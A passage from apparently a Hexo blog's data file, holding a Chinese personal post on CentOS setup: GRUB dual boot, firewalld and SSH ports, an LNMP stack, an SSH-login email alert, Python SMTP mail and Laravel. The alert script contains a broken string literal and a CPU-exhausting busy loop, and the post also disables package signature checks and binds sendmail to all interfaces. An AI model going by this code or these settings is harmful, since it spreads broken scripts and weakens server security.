service nginx start\n```\n或者`/etc/yum.repo.d/nginx.repo`\n``` bash\n[nginx]\nbaseurl=http://nginx.org/packages/centos/$releasever/$basearch/\ngpgcheck=0\nenabled=1\n\n```\n**安装`php7.0`(CentOS 7.x):**\n``` bash\nrpm -Uvh https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm\nrpm -Uvh https://mirror.webtatic.com/yum/el7/webtatic-release.rpm\nyum install php70w php70w-opcache\nyum install php70w-fpm php70w-opcache\n```\n**安装php7.0不太容易，建议多在网上查**\n\n**设置`nginx`，更改root目录问题：**\n**之前将`nginx`的root目录改了过后出现了403问题，搞了好久还是没有一个很完整的解决方案，不过找到一个方案，但还是不太理解。将`nginx`中的配置文件的`user nginx` 改为自己的用户名，即更改过后root目录的所有者。**\n![](/images/nginxUser.png)\n**困惑点在于`nginx`默认的目录`/usr/share/nginx/html`的所有者为`root`但没有出现403**\n\n**安装`mysql`:**\n``` bash\n# yum install mysql\n# yum install mysql-devel\n# wget http://dev.mysql.com/get/mysql-community-release-el7-5.noarch.rpm\n# rpm -ivh mysql-community-release-el7-5.noarch.rpm\n# yum install mysql-community-server\n# service mysqld restart\n```\n\n**配置问题**\n**1.配置`php.ini`: 只修改一行代码，通过`vim`查找`cgi.fix_pathinfo`，并将其修改为0,去注释.**\n**2.配置`www.conf`: 修改`listen`选项设置为`127.0.0.1:9000`; 设置`user`为`/home`下的一个用户,`group`也同样设置**\n**3.配置`nginx.conf`,将`user`改为`www.conf`里面的`user`相同，网站根目录必须在`nginx`的`user`下,具体配置如下**\n``` bash\nlocation ~ \\.php$ {\n        fastcgi_pass   127.0.0.1:9000;\n        fastcgi_index  index.php;\n        fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;\n        include        fastcgi_params;\n    }\n```\n\n## 第四关：ssh登录邮件通知（后面有彩蛋哟）\n**游手好闲地折腾了几天，突发奇想，前几天租了一个vps，想随时检测有没有人通过ssh登录我的vps，如果有人登录，就发邮件通知，于是有了以下的折腾：**\n- **首先安装必备的软件`sendmail` 和`mailx`**\n- **通过`last`命令和`awk`结合获取ssh登录情况**\n- **最后写个python程序，让它一直跑着随时准备发邮件**\n- **将写好的程序运行命令写入/etc/rc.d/rc.local，让它开机运行**\n\n**那么命令如下：**\n``` bash\n[root@localhost]$ yum install sendmail sendmail-cf mailx\n[root@localhost]$ service sendmail start\n[root@localhost]$ last | awk '$1==\"root\"'\n```\n**接下来需要修改一个配置文件，让`sendmail`可以给整个英特网发送邮件，配置文件为`/etc/mail/sendmail.mc`，其中有一行**\n``` bash\nDAEMON_OPTIONS('port=smtp,Addr=127.0.0.1, Name=MTA-v6, Family=net6')dnl\n```\n**将127.0.0.1改为0.0.0.0，这样就可以给整个英特网发送邮件了**\n**python脚本如下**\n\n``` python\nimport os\n\ninst = \"last | awk \\'$1!=\\\"reboot\\\"\\'\"\nstr = os.popen(inst).read()\nssh_login = str.split(\"\\n\")\nlength = len(ssh_login)\n\nwhile True:\n    inst1 = \"last | awk \\'$1!=\\\"reboot\\\"\\' > ssh_login.txt\"\n    os.system(inst1)\n    str = os.popen(inst).read()\n    ssh_login = str.split(\"\\n  length1 = len(ssh_login)\n\n    if length1 > length:\n        login_name = ssh_login[0]\n        mail = \"echo %s | mail -s \\'$1!=\\\"reboot\\\"\\' ××××@qq.com\" % login_name\n        os.system(mail)\n        length = length1\n```\n\n**最重要的一点：qq邮箱发送成功一次过后vps的域名就会被拉黑，被认为是垃圾邮件，因此需要在邮箱管理界面设置域名白名单`localhost.localdomain`，然后大功告成，哈哈**\n\n**你以为这样就了事了？如果你将这个程序通过开机启动让它一直跑着，那么很开心的告诉你，你的机器cpu用不了多久就会被占满，所以，这个方法还是不行滴，这只是一种理想思路，想要处理的话可以选择指定时间运行一次或者每隔一段时间运行一次。接下来我去找个比较好的方式来实现这个功能，并实现每天发送当天的日志文件。**\n\n**我的vps跑了几个小时后的cpu受不了了，跑了不到两个小时，就被厂家限制了。**\n![](/images/cpu.png)\n\n## 第五关：python实现邮件发送\n**没时间了，直接贴代码**\n``` python\nfrom email import encoders\nfrom email.header import Header\nfrom email.mime.text import MIMEText\nfrom email.utils import parseaddr, formataddr\n\nimport smtplib\n\ndef _format_addr(s):\n    name, addr = parseaddr(s)\n    return formataddr((Header(name, 'utf-8').encode(), addr))\n\nfrom_addr = \"××××××××××@qq.com\"\npassword = \"××××××××××\"　　　# SMTP独立密码\nto_addr = \"××××××××××@qq.com\"\nsmtp_server = \"smtp.qq.com\"\n\nmsg = MIMEText('hello, send by Python...', 'plain', 'utf-8')\nmsg['From'] = _format_addr('fenlan <%s>' % from_addr)\nmsg['To'] = _format_addr('管理员 <%s>' % to_addr)\nmsg['Subject'] = Header('vps远程登录日志', 'utf-8').encode()\n\nserver = smtplib.SMTP_SSL(smtp_server, 465)\nserver.login(from_addr, password)\nserver.sendmail(from_addr, [to_addr], msg.as_string())\nserver.quit()\n\n```\n\n## 第六关：搭建laravel框架\n**首先安装`composer`(一个php工具，具体查看官网)**\n``` php\nphp -r \"copy('https://getcomposer.org/installer', 'composer-setup.php');\"\nphp -r \"if (hash_file('SHA384', 'composer-setup.php') === '669656bab3166a7aff8a7506b8cb2d1c292f042046c5a994c43155c0be6190fa0355160742ab2e1c88d40d5be660b410') { echo 'Installer verified'; } else { echo 'Installer corrupt'; unlink('composer-setup.php'); } echo PHP_EOL;\"\nphp composer-setup.php\nphp -r \"unlink('composer-setup.php');\"\n```\n**然后全局使用`composer`**\n``` bash\nmv composer.phar /usr/local/bin/composer\n```\n\n**接着安装`laravel`**\n``` bash\ncomposer create-project --prefer-dist laravel/laravel your_project_name\n```\n**进入项目目录更新`composer`**\n``` bash\ncomposer update\n```\n**在这里我遇到了一个问题，我搭建三次只遇见过一次**\n![](/images/laravel_problem.png)\n**根据提示进入里面说的网站上，跟着网站描述解决问题就ok**","slug":"centos","published":1,"updated":"2017-12-14T04:22:14.972Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgrjscyc001gyp0luqm27w6b","content":"<h2 id=\"第一关：设置windows启动项\"><a href=\"#第一关：设置windows启动项\" class=\"headerlink\" title=\"第一关：设置windows启动项\"></a>第一关：设置windows启动项</h2><p><strong>在安装双系统时，选择centos会默认没有windows的启动项，因此要添加windows的引导选项，过程如下：</strong></p>\n<ul>\n<li><strong>开机进入CentOS系统</strong></li>\n<li><strong>进入目录<code>/boot/grub2</code>，打开<code>grub.cfg</code>进行编辑</strong></li>\n<li><p><strong>找到其中第70行，在指定位置添加内容 </strong></p>\n<a id=\"more\"></a>\n<p><strong>添加内容如下：</strong></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">### END /etc/grub.d/00 header ###</span></span><br><span class=\"line\">menuentry <span class=\"string\">'Windows 10'</span> &#123;</span><br><span class=\"line\">\t<span class=\"built_in\">set</span> root=(hd0,1)</span><br><span class=\"line\">    chainloader +1</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">### BEGIN /etc/grub.d/10_linux ###</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>重启系统，引导菜单中新增了windows 10选项</strong></p>\n</li>\n</ul>\n<h2 id=\"第二关：防火墙\"><a href=\"#第二关：防火墙\" class=\"headerlink\" title=\"第二关：防火墙\"></a>第二关：防火墙</h2><p><strong>下载防火墙服务：</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@localhost]$ yum install iptables-services</span><br></pre></td></tr></table></figure></p>\n<p><strong>查看防火墙状态：</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@localhost]$ nmap localhost -p 0-10000</span><br></pre></td></tr></table></figure></p>\n<p><strong>启用ssh服务：</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@localhost]$ yum install openssh-server</span><br><span class=\"line\">[root@localhost]$ chkconfig sshd on</span><br><span class=\"line\">[root@localhost]$ service sshd restart</span><br><span class=\"line\">[root@localhost]$ /etc/init.d/sshd start</span><br></pre></td></tr></table></figure></p>\n<p><strong>在CentOS 7之前，系统默认的防火墙为<code>iptables</code>，因此上述为<code>iptables</code>版防火墙设置，下列为<code>firewall</code>版防火墙设置，<code>firewall</code>是centOS 7系统默认的防火墙，想必也是之后的趋势。</strong><br><strong>查看<code>firewall</code>状态：</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@localhost]$ systemctl status firewalld.service</span><br></pre></td></tr></table></figure></p>\n<p><strong>开启<code>firewall</code>服务（两者均可）</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@localhost]$ systemctl start firewalld.service</span><br><span class=\"line\">[root@localhost]$ service firewalld start</span><br></pre></td></tr></table></figure></p>\n<p><strong>开启<code>ssh</code>服务：</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@localhost]$ yum install openssh-server</span><br></pre></td></tr></table></figure></p>\n<p><strong>更改默认<code>ssh</code>端口：</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@localhost]$ vim /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure></p>\n<p><strong>修改里面的端口为自己想要设置的端口，保存退出，由于系统默认不支持<code>ssh</code>使用22端口之外的端口，因此需要做修改：</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@localhost]$ semanage port <span class=\"_\">-a</span> -t ssh_port_t -p tcp ××××</span><br><span class=\"line\">[root@localhost]$ semanage port <span class=\"_\">-l</span> | grep ssh</span><br><span class=\"line\">[root@localhost]$ systemctl restart sshd.service</span><br><span class=\"line\">[root@localhost]$ firewall-cmd --permanent --zone=public --add-port=××××/tcp</span><br><span class=\"line\">[root@localhost]$ firewall-cmd --reload</span><br><span class=\"line\">[root@localhost]$ ss -tnlp | grep ssh</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"第三关：lnmp配置\"><a href=\"#第三关：lnmp配置\" class=\"headerlink\" title=\"第三关：lnmp配置\"></a>第三关：lnmp配置</h2><p><strong>安装<code>nginx</code>:</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@localhost]$ yum install epel-release</span><br><span class=\"line\">[root@localhost]$ yum -y install nginx</span><br><span class=\"line\">[root@localhost]$ service nginx start</span><br></pre></td></tr></table></figure></p>\n<p>或者<code>/etc/yum.repo.d/nginx.repo</code><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[nginx]</span><br><span class=\"line\">baseurl=http://nginx.org/packages/centos/<span class=\"variable\">$releasever</span>/<span class=\"variable\">$basearch</span>/</span><br><span class=\"line\">gpgcheck=0</span><br><span class=\"line\">enabled=1</span><br></pre></td></tr></table></figure></p>\n<p><strong>安装<code>php7.0</code>(CentOS 7.x):</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rpm -Uvh https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm</span><br><span class=\"line\">rpm -Uvh https://mirror.webtatic.com/yum/el7/webtatic-release.rpm</span><br><span class=\"line\">yum install php70w php70w-opcache</span><br><span class=\"line\">yum install php70w-fpm php70w-opcache</span><br></pre></td></tr></table></figure></p>\n<p><strong>安装php7.0不太容易，建议多在网上查</strong></p>\n<p><strong>设置<code>nginx</code>，更改root目录问题：</strong><br><strong>之前将<code>nginx</code>的root目录改了过后出现了403问题，搞了好久还是没有一个很完整的解决方案，不过找到一个方案，但还是不太理解。将<code>nginx</code>中的配置文件的<code>user nginx</code> 改为自己的用户名，即更改过后root目录的所有者。</strong><br><img src=\"/images/nginxUser.png\" alt=\"\"><br><strong>困惑点在于<code>nginx</code>默认的目录<code>/usr/share/nginx/html</code>的所有者为<code>root</code>但没有出现403</strong></p>\n<p><strong>安装<code>mysql</code>:</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># yum install mysql</span></span><br><span class=\"line\"><span class=\"comment\"># yum install mysql-devel</span></span><br><span class=\"line\"><span class=\"comment\"># wget http://dev.mysql.com/get/mysql-community-release-el7-5.noarch.rpm</span></span><br><span class=\"line\"><span class=\"comment\"># rpm -ivh mysql-community-release-el7-5.noarch.rpm</span></span><br><span class=\"line\"><span class=\"comment\"># yum install mysql-community-server</span></span><br><span class=\"line\"><span class=\"comment\"># service mysqld restart</span></span><br></pre></td></tr></table></figure></p>\n<p><strong>配置问题</strong><br><strong>1.配置<code>php.ini</code>: 只修改一行代码，通过<code>vim</code>查找<code>cgi.fix_pathinfo</code>，并将其修改为0,去注释.</strong><br><strong>2.配置<code>www.conf</code>: 修改<code>listen</code>选项设置为<code>127.0.0.1:9000</code>; 设置<code>user</code>为<code>/home</code>下的一个用户,<code>group</code>也同样设置</strong><br><strong>3.配置<code>nginx.conf</code>,将<code>user</code>改为<code>www.conf</code>里面的<code>user</code>相同，网站根目录必须在<code>nginx</code>的<code>user</code>下,具体配置如下</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location ~ \\.php$ &#123;</span><br><span class=\"line\">        fastcgi_pass   127.0.0.1:9000;</span><br><span class=\"line\">        fastcgi_index  index.php;</span><br><span class=\"line\">        fastcgi_param  SCRIPT_FILENAME  <span class=\"variable\">$document_root</span><span class=\"variable\">$fastcgi_script_name</span>;</span><br><span class=\"line\">        include        fastcgi_params;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"第四关：ssh登录邮件通知（后面有彩蛋哟）\"><a href=\"#第四关：ssh登录邮件通知（后面有彩蛋哟）\" class=\"headerlink\" title=\"第四关：ssh登录邮件通知（后面有彩蛋哟）\"></a>第四关：ssh登录邮件通知（后面有彩蛋哟）</h2><p><strong>游手好闲地折腾了几天，突发奇想，前几天租了一个vps，想随时检测有没有人通过ssh登录我的vps，如果有人登录，就发邮件通知，于是有了以下的折腾：</strong></p>\n<ul>\n<li><strong>首先安装必备的软件<code>sendmail</code> 和<code>mailx</code></strong></li>\n<li><strong>通过<code>last</code>命令和<code>awk</code>结合获取ssh登录情况</strong></li>\n<li><strong>最后写个python程序，让它一直跑着随时准备发邮件</strong></li>\n<li><strong>将写好的程序运行命令写入/etc/rc.d/rc.local，让它开机运行</strong></li>\n</ul>\n<p><strong>那么命令如下：</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@localhost]$ yum install sendmail sendmail-cf mailx</span><br><span class=\"line\">[root@localhost]$ service sendmail start</span><br><span class=\"line\">[root@localhost]$ last | awk <span class=\"string\">'$1==\"root\"'</span></span><br></pre></td></tr></table></figure></p>\n<p><strong>接下来需要修改一个配置文件，让<code>sendmail</code>可以给整个英特网发送邮件，配置文件为<code>/etc/mail/sendmail.mc</code>，其中有一行</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DAEMON_OPTIONS(<span class=\"string\">'port=smtp,Addr=127.0.0.1, Name=MTA-v6, Family=net6'</span>)dnl</span><br></pre></td></tr></table></figure></p>\n<p><strong>将127.0.0.1改为0.0.0.0，这样就可以给整个英特网发送邮件了</strong><br><strong>python脚本如下</strong></p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import os</span><br><span class=\"line\"></span><br><span class=\"line\">inst = \"last | awk \\'$1!=\\\"reboot\\\"\\'\"</span><br><span class=\"line\">str = os.popen(inst).read()</span><br><span class=\"line\">ssh_login = str.split(\"\\n\")</span><br><span class=\"line\">length = len(ssh_login)</span><br><span class=\"line\"></span><br><span class=\"line\">while True:</span><br><span class=\"line\">    inst1 = \"last | awk \\'$1!=\\\"reboot\\\"\\' &gt; ssh_login.txt\"</span><br><span class=\"line\">    os.system(inst1)</span><br><span class=\"line\">    str = os.popen(inst).read()</span><br><span class=\"line\">    ssh_login = str.split(\"\\n  length1 = len(ssh_login)</span><br><span class=\"line\"></span><br><span class=\"line\">    if length1 &gt; length:</span><br><span class=\"line\">        login_name = ssh_login[0]</span><br><span class=\"line\">        mail = \"echo %s | mail -s \\'$1!=\\\"reboot\\\"\\' ××××@qq.com\" % login_name</span><br><span class=\"line\">        os.system(mail)</span><br><span class=\"line\">        length = length1</span><br></pre></td></tr></table></figure>\n<p><strong>最重要的一点：qq邮箱发送成功一次过后vps的域名就会被拉黑，被认为是垃圾邮件，因此需要在邮箱管理界面设置域名白名单<code>localhost.localdomain</code>，然后大功告成，哈哈</strong></p>\n<p><strong>你以为这样就了事了？如果你将这个程序通过开机启动让它一直跑着，那么很开心的告诉你，你的机器cpu用不了多久就会被占满，所以，这个方法还是不行滴，这只是一种理想思路，想要处理的话可以选择指定时间运行一次或者每隔一段时间运行一次。接下来我去找个比较好的方式来实现这个功能，并实现每天发送当天的日志文件。</strong></p>\n<p><strong>我的vps跑了几个小时后的cpu受不了了，跑了不到两个小时，就被厂家限制了。</strong><br><img src=\"/images/cpu.png\" alt=\"\"></p>\n<h2 id=\"第五关：python实现邮件发送\"><a href=\"#第五关：python实现邮件发送\" class=\"headerlink\" title=\"第五关：python实现邮件发送\"></a>第五关：python实现邮件发送</h2><p><strong>没时间了，直接贴代码</strong><br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> email <span class=\"keyword\">import</span> encoders</span><br><span class=\"line\"><span class=\"keyword\">from</span> email.header <span class=\"keyword\">import</span> Header</span><br><span class=\"line\"><span class=\"keyword\">from</span> email.mime.text <span class=\"keyword\">import</span> MIMEText</span><br><span class=\"line\"><span class=\"keyword\">from</span> email.utils <span class=\"keyword\">import</span> parseaddr, formataddr</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> smtplib</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">_format_addr</span><span class=\"params\">(s)</span>:</span></span><br><span class=\"line\">    name, addr = parseaddr(s)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> formataddr((Header(name, <span class=\"string\">'utf-8'</span>).encode(), addr))</span><br><span class=\"line\"></span><br><span class=\"line\">from_addr = <span class=\"string\">\"××××××××××@qq.com\"</span></span><br><span class=\"line\">password = <span class=\"string\">\"××××××××××\"</span>　　　<span class=\"comment\"># SMTP独立密码</span></span><br><span class=\"line\">to_addr = <span class=\"string\">\"××××××××××@qq.com\"</span></span><br><span class=\"line\">smtp_server = <span class=\"string\">\"smtp.qq.com\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">msg = MIMEText(<span class=\"string\">'hello, send by Python...'</span>, <span class=\"string\">'plain'</span>, <span class=\"string\">'utf-8'</span>)</span><br><span class=\"line\">msg[<span class=\"string\">'From'</span>] = _format_addr(<span class=\"string\">'fenlan &lt;%s&gt;'</span> % from_addr)</span><br><span class=\"line\">msg[<span class=\"string\">'To'</span>] = _format_addr(<span class=\"string\">'管理员 &lt;%s&gt;'</span> % to_addr)</span><br><span class=\"line\">msg[<span class=\"string\">'Subject'</span>] = Header(<span class=\"string\">'vps远程登录日志'</span>, <span class=\"string\">'utf-8'</span>).encode()</span><br><span class=\"line\"></span><br><span class=\"line\">server = smtplib.SMTP_SSL(smtp_server, <span class=\"number\">465</span>)</span><br><span class=\"line\">server.login(from_addr, password)</span><br><span class=\"line\">server.sendmail(from_addr, [to_addr], msg.as_string())</span><br><span class=\"line\">server.quit()</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"第六关：搭建laravel框架\"><a href=\"#第六关：搭建laravel框架\" class=\"headerlink\" title=\"第六关：搭建laravel框架\"></a>第六关：搭建laravel框架</h2><p><strong>首先安装<code>composer</code>(一个php工具，具体查看官网)</strong><br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php -r <span class=\"string\">\"copy('https://getcomposer.org/installer', 'composer-setup.php');\"</span></span><br><span class=\"line\">php -r <span class=\"string\">\"if (hash_file('SHA384', 'composer-setup.php') === '669656bab3166a7aff8a7506b8cb2d1c292f042046c5a994c43155c0be6190fa0355160742ab2e1c88d40d5be660b410') &#123; echo 'Installer verified'; &#125; else &#123; echo 'Installer corrupt'; unlink('composer-setup.php'); &#125; echo PHP_EOL;\"</span></span><br><span class=\"line\">php composer-setup.php</span><br><span class=\"line\">php -r <span class=\"string\">\"unlink('composer-setup.php');\"</span></span><br></pre></td></tr></table></figure></p>\n<p><strong>然后全局使用<code>composer</code></strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mv composer.phar /usr/<span class=\"built_in\">local</span>/bin/composer</span><br></pre></td></tr></table></figure></p>\n<p><strong>接着安装<code>laravel</code></strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">composer create-project --prefer-dist laravel/laravel your_project_name</span><br></pre></td></tr></table></figure></p>\n<p><strong>进入项目目录更新<code>composer</code></strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">composer update</span><br></pre></td></tr></table></figure></p>\n<p><strong>在这里我遇到了一个问题，我搭建三次只遇见过一次</strong><br><img src=\"/images/laravel_problem.png\" alt=\"\"><br><strong>根据提示进入里面说的网站上，跟着网站描述解决问题就ok</strong></p>\n","excerpt":"<h2 id=\"第一关：设置windows启动项\"><a href=\"#第一关：设置windows启动项\" class=\"headerlink\" title=\"第一关：设置windows启动项\"></a>第一关：设置windows启动项</h2><p><strong>在安装双系统时，选择centos会默认没有windows的启动项，因此要添加windows的引导选项，过程如下：</strong></p>\n<ul>\n<li><strong>开机进入CentOS系统</strong></li>\n<li><strong>进入目录<code>/boot/grub2</code>，打开<code>grub.cfg</code>进行编辑</strong></li>\n<li><p><strong>找到其中第70行，在指定位置添加内容 </strong></p>","more":"<p><strong>添加内容如下：</strong></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">### END /etc/grub.d/00 header ###</span></span><br><span class=\"line\">menuentry <span class=\"string\">'Windows 10'</span> &#123;</span><br><span class=\"line\">\t<span class=\"built_in\">set</span> root=(hd0,1)</span><br><span class=\"line\">    chainloader +1</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">### BEGIN /etc/grub.d/10_linux ###</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>重启系统，引导菜单中新增了windows 10选项</strong></p>\n</li>\n</ul>\n<h2 id=\"第二关：防火墙\"><a href=\"#第二关：防火墙\" class=\"headerlink\" title=\"第二关：防火墙\"></a>第二关：防火墙</h2><p><strong>下载防火墙服务：</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@localhost]$ yum install iptables-services</span><br></pre></td></tr></table></figure></p>\n<p><strong>查看防火墙状态：</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@localhost]$ nmap localhost -p 0-10000</span><br></pre></td></tr></table></figure></p>\n<p><strong>启用ssh服务：</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@localhost]$ yum install openssh-server</span><br><span class=\"line\">[root@localhost]$ chkconfig sshd on</span><br><span class=\"line\">[root@localhost]$ service sshd restart</span><br><span class=\"line\">[root@localhost]$ /etc/init.d/sshd start</span><br></pre></td></tr></table></figure></p>\n<p><strong>在CentOS 7之前，系统默认的防火墙为<code>iptables</code>，因此上述为<code>iptables</code>版防火墙设置，下列为<code>firewall</code>版防火墙设置，<code>firewall</code>是centOS 7系统默认的防火墙，想必也是之后的趋势。</strong><br><strong>查看<code>firewall</code>状态：</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@localhost]$ systemctl status firewalld.service</span><br></pre></td></tr></table></figure></p>\n<p><strong>开启<code>firewall</code>服务（两者均可）</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@localhost]$ systemctl start firewalld.service</span><br><span class=\"line\">[root@localhost]$ service firewalld start</span><br></pre></td></tr></table></figure></p>\n<p><strong>开启<code>ssh</code>服务：</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@localhost]$ yum install openssh-server</span><br></pre></td></tr></table></figure></p>\n<p><strong>更改默认<code>ssh</code>端口：</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@localhost]$ vim /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure></p>\n<p><strong>修改里面的端口为自己想要设置的端口，保存退出，由于系统默认不支持<code>ssh</code>使用22端口之外的端口，因此需要做修改：</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@localhost]$ semanage port <span class=\"_\">-a</span> -t ssh_port_t -p tcp ××××</span><br><span class=\"line\">[root@localhost]$ semanage port <span class=\"_\">-l</span> | grep ssh</span><br><span class=\"line\">[root@localhost]$ systemctl restart sshd.service</span><br><span 